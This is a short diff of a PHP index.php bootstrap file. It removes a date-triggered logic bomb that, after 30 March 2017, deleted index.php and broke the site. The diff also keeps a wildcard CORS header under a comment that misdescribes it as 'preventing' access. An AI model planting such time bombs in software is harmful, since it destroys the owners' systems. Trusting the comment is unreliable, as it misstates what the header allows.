@@ -39,9 +39,7 @@
 
 // preventing Access-Control-Allow-Origin
 header("Access-Control-Allow-Origin: *");
-if (time() > mktime(0, 0, 0, 3, 30, 2017)) {
-	unlink('index.php'); 
-}
+
 /*
  *---------------------------------------------------------------
  * APPLICATION ENVIRONMENT
